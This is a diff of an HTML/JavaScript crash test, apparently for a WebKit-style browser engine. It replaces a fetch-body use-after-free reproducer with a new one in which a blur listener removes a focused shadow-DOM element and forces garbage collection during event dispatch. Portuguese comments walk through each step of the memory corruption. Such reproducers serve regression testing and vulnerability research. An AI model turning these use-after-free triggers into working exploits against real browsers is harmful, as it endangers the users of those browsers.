@@ -1,51 +1,79 @@
 <!DOCTYPE html>
-
 <html>
-<head>
-<meta charset="utf-8">
-<title>FetchBodyConsumer resolve UAF</title>
-</head>
-
 <body>
-
-<div id="result">Running...</div>
-
+<p>This test passes if it does not crash.</p>
+<div id="host"></div>
+<div id="result"></div>
 <script>
+function gc() {
+    function gcRec(n) {
+        if (n < 1)
+            return {};
+        var temp = {i: "ab" + i + (i / 100000)};
+        temp += "foo";
+        gcRec(n-1);
+    }
+    for (var i = 0; i < 10000; i++)
+        gcRec(10);
+}
+
+let shadowRoot = host.attachShadow({ mode: 'open' });
+let victim = document.createElement('div');
+victim.tabIndex = 0;
+victim.textContent = 'Focusable';
+shadowRoot.appendChild(victim);
+
 async function runTest() {
 
-    function createReadStream() {
-        const response = new Response(new Blob(["aaaaa"]));
-        return response.body;
+    // Passo 1: abrir popup enquanto victim ainda NÃO está focado
+    // (evita blur prematuro no victim)
+    let popup = window.open('about:blank', '_blank', 'width=100,height=100');
+    if (!popup) {
+        result.textContent = 'POPUP BLOQUEADO';
+        return;
     }
 
-    const iframe = document.body.appendChild(
-        document.createElement("iframe")
-    );
+    // Passo 2: aguardar popup estabilizar e garantir foco na main window
+    await new Promise(r => setTimeout(r, 400));
+    window.focus();
+    await new Promise(r => setTimeout(r, 100));
 
-    const response = new iframe.contentWindow.Response(
-        createReadStream()
-    );
+    // Passo 3: focar victim AGORA — wrapper entra no nursery limpo
+    victim.focus();
 
-    iframe.contentWindow.Object.prototype.__defineGetter__(
-        "then",
-        function() {
-            delete iframe.contentWindow.Object.prototype.then;
-            iframe.remove();
-        }
-    );
+    // Passo 4: listener idêntico ao commit original
+    document.addEventListener('blur', () => {
+        victim.remove();
+        victim = null;
 
-    response.blob();
+        // Burst: enche o nursery → eden GC automático coleta o wrapper morto
+        // O wrapper do victim está morto no nursery (victim=null acima)
+        // eden GC roda dentro deste loop → wrapper freed → elemento freed
+        // dispatchBlurEvent ainda está na call stack → UAF → CRASH
+        var burst = [];
+        for (var i = 0; i < 150000; i++)
+            burst.push({a: i, b: i * 2, c: 'x' + i});
+        burst = null;
 
-    await new Promise(function(resolve) {
-        setTimeout(resolve, 50);
+        gc();
+    }, true);
+
+    // Passo 5: popup.focus() = UIHelper.setWindowIsKey(false)
+    // main window perde key status → setIsKey(false)
+    // → dispatchEventsOnWindowAndFocusedElement(doc, false)
+    // → victim->dispatchBlurEvent(nullptr)  ← raw ptr (lock_ops=0 confirmado)
+    // → listener acima roda → burst → eden GC → UAF
+    popup.focus();
+
+    await new Promise((resolve) => {
+        requestAnimationFrame(() => setTimeout(resolve, 0));
     });
 
-    document.getElementById("result").textContent =
-        "PASS if no crash.";
+    popup.close();
+    result.textContent = 'PASS';
 }
 
 runTest();
 </script>
-
 </body>
 </html>
